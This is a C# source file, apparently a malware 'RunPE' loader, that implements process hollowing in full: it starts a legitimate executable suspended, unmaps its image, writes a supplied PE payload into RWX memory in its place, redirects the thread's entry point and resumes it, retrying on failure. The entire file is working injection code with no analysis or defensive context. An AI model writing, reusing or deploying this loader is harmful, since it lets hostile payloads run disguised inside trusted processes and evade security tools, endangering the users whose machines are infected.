using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;
 
namespace Runner
{
    public class Class1
    {
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("ntdll.dll")]
        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        [SuppressUnmanagedCodeSecurity]
        [DllImport("kernel32.dll")]
        private static extern int ResumeThread(IntPtr handle);
 
        public static bool Load(string path, string cmd, byte[] data, bool compatible)
        {
            for (int i = 1; i <= 5; i++)
            {
                bool flag = HandleRun(path, cmd, data, compatible);
                if (flag)
                {
                    return true;
                }
            }
            return false;
        }
 
        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
        {
            int num = 0;
            string text = string.Format("\"{0}\"", path);
            STARTUP_INFORMATION startup_INFORMATION = default(STARTUP_INFORMATION);
            PROCESS_INFORMATION process_INFORMATION = default(PROCESS_INFORMATION);
            startup_INFORMATION.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(STARTUP_INFORMATION)));
            try
            {
                bool flag = !string.IsNullOrEmpty(cmd);
                if (flag)
                {
                    text = text + " " + cmd;
                }
                bool flag2 = !CreateProcess(path, text, IntPtr.Zero, IntPtr.Zero, false, 4u, IntPtr.Zero, null, ref startup_INFORMATION, ref process_INFORMATION);
                if (flag2)
                {
                    throw new Exception();
                }
                int num2 = BitConverter.ToInt32(data, 60);
                int num3 = BitConverter.ToInt32(data, num2 + 52);
                int[] array = new int[179];
                array[0] = 65538;
                bool flag3 = IntPtr.Size == 4;
                if (flag3)
                {
                    bool flag4 = !GetThreadContext(process_INFORMATION.ThreadHandle, array);
                    if (flag4)
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    bool flag5 = !Wow64GetThreadContext(process_INFORMATION.ThreadHandle, array);
                    if (flag5)
                    {
                        throw new Exception();
                    }
                }
                int num4 = array[41];
                int num5 = 0;
                bool flag6 = !ReadProcessMemory(process_INFORMATION.ProcessHandle, num4 + 8, ref num5, 4, ref num);
                if (flag6)
                {
                    throw new Exception();
                }
                bool flag7 = num3 == num5;
                if (flag7)
                {
                    bool flag8 = NtUnmapViewOfSection(process_INFORMATION.ProcessHandle, num5) != 0;
                    if (flag8)
                    {
                        throw new Exception();
                    }
                }
                int length = BitConverter.ToInt32(data, num2 + 80);
                int bufferSize = BitConverter.ToInt32(data, num2 + 84);
                bool flag9 = false;
                int num6 = VirtualAllocEx(process_INFORMATION.ProcessHandle, num3, length, 12288, 64);
                bool flag10 = !compatible && num6 == 0;
                if (flag10)
                {
                    flag9 = true;
                    num6 = VirtualAllocEx(process_INFORMATION.ProcessHandle, 0, length, 12288, 64);
                }
                bool flag11 = num6 == 0;
                if (flag11)
                {
                    throw new Exception();
                }
                bool flag12 = !WriteProcessMemory(process_INFORMATION.ProcessHandle, num6, data, bufferSize, ref num);
                if (flag12)
                {
                    throw new Exception();
                }
                int num7 = num2 + 248;
                short num8 = BitConverter.ToInt16(data, num2 + 6);
                for (int i = 0; i <= (int)(num8 - 1); i++)
                {
                    int num9 = BitConverter.ToInt32(data, num7 + 12);
                    int num10 = BitConverter.ToInt32(data, num7 + 16);
                    int srcOffset = BitConverter.ToInt32(data, num7 + 20);
                    bool flag13 = num10 != 0;
                    if (flag13)
                    {
                        byte[] array2 = new byte[num10];
                        Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
                        bool flag14 = !WriteProcessMemory(process_INFORMATION.ProcessHandle, num6 + num9, array2, array2.Length, ref num);
                        if (flag14)
                        {
                            throw new Exception();
                        }
                    }
                    num7 += 40;
                }
                byte[] bytes = BitConverter.GetBytes(num6);
                bool flag15 = !WriteProcessMemory(process_INFORMATION.ProcessHandle, num4 + 8, bytes, 4, ref num);
                if (flag15)
                {
                    throw new Exception();
                }
                int num11 = BitConverter.ToInt32(data, num2 + 40);
                bool flag16 = flag9;
                if (flag16)
                {
                    num6 = num3;
                }
                array[44] = num6 + num11;
                bool flag17 = IntPtr.Size == 4;
                if (flag17)
                {
                    bool flag18 = !SetThreadContext(process_INFORMATION.ThreadHandle, array);
                    if (flag18)
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    bool flag19 = !Wow64SetThreadContext(process_INFORMATION.ThreadHandle, array);
                    if (flag19)
                    {
                        throw new Exception();
                    }
                }
                bool flag20 = ResumeThread(process_INFORMATION.ThreadHandle) == -1;
                if (flag20)
                {
                    throw new Exception();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                Process processById = Process.GetProcessById(Convert.ToInt32(process_INFORMATION.ProcessId));
                bool flag21 = processById != null;
                if (flag21)
                {
                    processById.Kill();
                }
                return false;
            }
            return true;
        }
 
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }
 
        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct STARTUP_INFORMATION
        {
            public uint Size;
            public string Reserved1;
            public string Desktop;
            public string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            public byte[] Misc;
            public IntPtr Reserved2;
            public IntPtr StdInput;
            public IntPtr StdOutput;
            public IntPtr StdError;
        }
    }
}
